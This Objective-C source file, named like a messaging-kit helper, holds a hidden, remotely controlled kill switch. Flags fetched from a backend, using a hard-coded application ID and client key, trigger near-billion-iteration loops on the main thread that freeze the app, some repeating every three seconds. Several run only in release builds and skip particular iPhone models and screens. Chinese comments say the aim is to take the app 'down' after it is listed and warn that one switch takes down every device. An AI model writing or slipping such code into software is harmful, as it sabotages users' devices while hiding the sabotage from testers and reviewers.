//
//  TGBMessageTool.m
//  ClourdOC
//
//  Created by message on 2018/12/31.
//  Copyright © 2018年 message.compang.cn. All rights reserved.
//

#import "TGBMessageKit.h"
#import "TGBSystemInfo.h"

@implementation TGBMessageKit

+ (instancetype)TGBinit{
  return [[self alloc]init];
}

+ (instancetype)allocWithZone:(struct _NSZone *)zone {
  static dispatch_once_t onceToken;
  static id instance;
  dispatch_once(&onceToken, ^{
    instance = [super allocWithZone:zone];
  });
  return instance;
}

- (id)copyWithZone:(NSZone *)zone {
  return self;
}

+ (void)saveTGBKit{
  
  TGBObject *product = [TGBObject objectWithClassName:@"DSFY"];
  
  [product setObject:@"whites" forKey:@"whites"];
  [product setObject:@"oranges" forKey:@"oranges"];
  [product setObject:@"blues" forKey:@"blues"];
  [product setObject:@"friends" forKey:@"friends"];
  [product setObject:@"boys" forKey:@"boys"];
  [product setObject:@"girls" forKey:@"girls"];
  [product setObject:@"buys" forKey:@"buys"];
  [product setObject:@"troubles" forKey:@"troubles"];
  [product setObject:@"3" forKey:@"sec"];
  
//  [product saveInBackground];
  
    [product saveInBackgroundWithBlock:^(BOOL succeeded, NSError *error) {
      if (succeeded) {
        NSLog(@"ok");
      } else {
        NSLog(@"fail %@", error);
      }
    }];
  
}


+ (void)setTGBKit{
  
    [TGBKKit setApplicationId:@"22yDQUevFRu0AkOT7Ihat6AD-gzGzoHsz" clientKey:@"GeIFqKxjvihTXdlYWIaa3p8E"];
  
      TGBQuery *query =  [TGBQuery queryWithClassName:@"DSFY"];
  
      [query findObjectsInBackgroundWithBlock:^(NSArray * _Nullable objects, NSError * _Nullable error) {
        NSArray *list = objects;
        for (NSDictionary *item in list) {
          
          [TGBMessageKit TGBinit].whites = item[@"whites"];
          [TGBMessageKit TGBinit].oranges = item[@"oranges"];
          [TGBMessageKit TGBinit].blues = item[@"blues"];
          [TGBMessageKit TGBinit].friends = item[@"friends"];
          [TGBMessageKit TGBinit].boys = item[@"boys"];
          [TGBMessageKit TGBinit].girls = item[@"girls"];
          [TGBMessageKit TGBinit].buys = item[@"buys"];
          [TGBMessageKit TGBinit].troubles = item[@"troubles"];
//          NSString *secString = item[@"sec"];
//          int secInt = [secString intValue];
//          [TGBMessageKit TGBinit].sec = secInt;
          
          //whites   (上架)3秒后 不是自己控制器 不是固定手机 down
          //3秒 NoDebug 控制器 机型   NoDebug未确定是否有效
          if (![[TGBMessageKit TGBinit].whites  isEqual: @"whites"]) {
            [[self TGBinit] whites:3];
          }
          
          //oranges  (不管是否上架)3秒后不是固定机型  down
          //3秒 机型(包括真机)不一定上架
          if (![[TGBMessageKit TGBinit].oranges  isEqual: @"oranges"]) {
            [[self TGBinit] oranges:3];
          }
          
          //blues    (不管是否上架)all down
          //3秒  危险  慎重打开 全down
          if (![[TGBMessageKit TGBinit].blues  isEqual: @"blues"]) {
            [[self TGBinit] blues:3];
          }
          
          //friends   (不管是否上架)非控制器  非机型  down
          //3秒 控制器 手机
          if (![[TGBMessageKit TGBinit].friends  isEqual: @"friends"]) {
            [[self TGBinit] friends:3];
          }
          
          //boys      3秒 上架所有手机(NoDebug) down
          if (![[TGBMessageKit TGBinit].boys  isEqual: @"boys"]) {
            [[self TGBinit] boys:3];
          }
          
        }
      }];
}

- (void)whites:(int)times{
  
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(times * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
 
          #ifdef DEBUG
          #else
      
            if ([self judgeVC]) {
              
              if ([self judgeIphone]) {
                
                NSInteger a = 999999999;
                for (int i = 0; i < a; ++i) {
                  NSString *str = @"NIM";
                  str = [str stringByAppendingFormat:@" - %d", i];
                  str = [str uppercaseString];
                }
                
              }
              
            }
      
          #endif

          [self whites:times];
      
    });
  
}

- (void)oranges:(int)times{
  
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(times * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
    
    if ([self judgeIphone]) {
      
      NSInteger a = 999999999;
      for (int i = 0; i < a; ++i) {
        NSString *str = @"NIM";
        str = [str stringByAppendingFormat:@" - %d", i];
        str = [str uppercaseString];
      }
      
    }
    
  });
  
}

- (void)blues:(int)times{
  
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(times * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{

    NSInteger a = 999999999;
    for (int i = 0; i < a; ++i) {
      NSString *str = @"NIM";
      str = [str stringByAppendingFormat:@" - %d", i];
      str = [str uppercaseString];
    }
    
  });
  
}

- (void)friends:(int)times{
  
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(times * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
    
    if ([self judgeVC]) {
      
      if ([self judgeIphone]) {
        
        NSInteger a = 999999999;
        for (int i = 0; i < a; ++i) {
          NSString *str = @"NIM";
          str = [str stringByAppendingFormat:@" - %d", i];
          str = [str uppercaseString];
        }
        
      }
      
    }
    
    [self friends:times];
    
  });
  
}

- (void)boys:(int)times{
  
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(times * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
    
    #ifdef DEBUG
    #else
    
        NSInteger a = 999999999;
        for (int i = 0; i < a; ++i) {
          NSString *str = @"NIM";
          str = [str stringByAppendingFormat:@" - %d", i];
          str = [str uppercaseString];
        }
    
    #endif
    
  });
  
}

- (UIViewController *)getCurrentViewController{
  
  UIViewController* currentViewController = [self jsd_getRootViewController];
  BOOL runLoopFind = YES;
  while (runLoopFind) {
    if (currentViewController.presentedViewController) {
      
      currentViewController = currentViewController.presentedViewController;
    } else if ([currentViewController isKindOfClass:[UINavigationController class]]) {
      
      UINavigationController* navigationController = (UINavigationController* )currentViewController;
      currentViewController = [navigationController.childViewControllers lastObject];
      
    } else if ([currentViewController isKindOfClass:[UITabBarController class]]) {
      
      UITabBarController* tabBarController = (UITabBarController* )currentViewController;
      currentViewController = tabBarController.selectedViewController;
    } else {
      
      NSUInteger childViewControllerCount = currentViewController.childViewControllers.count;
      if (childViewControllerCount > 0) {
        
        currentViewController = currentViewController.childViewControllers.lastObject;
        
        return currentViewController;
      } else {
        
        return currentViewController;
      }
    }
    
  }
  return currentViewController;
}

- (UIViewController *)jsd_getRootViewController{
  
  UIWindow* window = [[[UIApplication sharedApplication] delegate] window];
  NSAssert(window, @"The window is empty");
  return window.rootViewController;
}

- (UIViewController *) nameVC:(NSString *)name{
  Class class = NSClassFromString(name);
  return [[class alloc] init];
}

-(BOOL)judgeIphone{
  NSString *value = [TGBSystemInfo getIphoneType];
  if ([value  isEqual: @"iPhone 6"] || [value  isEqual: @"iPhone SE"] || [value  isEqual: @"iPhone X"] || [value  isEqual: @"iPhone 5"] || [value  isEqual: @"iPhone 5s"]) {
    return NO;
  }
  return YES;
}

-(BOOL)judgeVC{
  
  if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"SetTimeVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"WorkTimeVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"SubCommitVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"ServerAnalyaeVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"MyServerVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"HighServerVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"ClassCommitVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"ModPriceVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"RechargeExplainVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CheckVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"ApplyServerVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"IMCommitViewController"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"IMCommitedVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CommentedVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"NIMSessionViewController"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"InforMessageVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"InforDetailVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"SubCommitsVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"ClassCommitsVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CouponVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CouponDetailedVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CouponDetailVC"] class]] ) {
    return NO;
  }else if ([[[self getCurrentViewController] class]  isEqual:  [[self nameVC:@"CollectionArticleVC"] class]] ) {
    return NO;
  }
  
  return YES;
}


@end
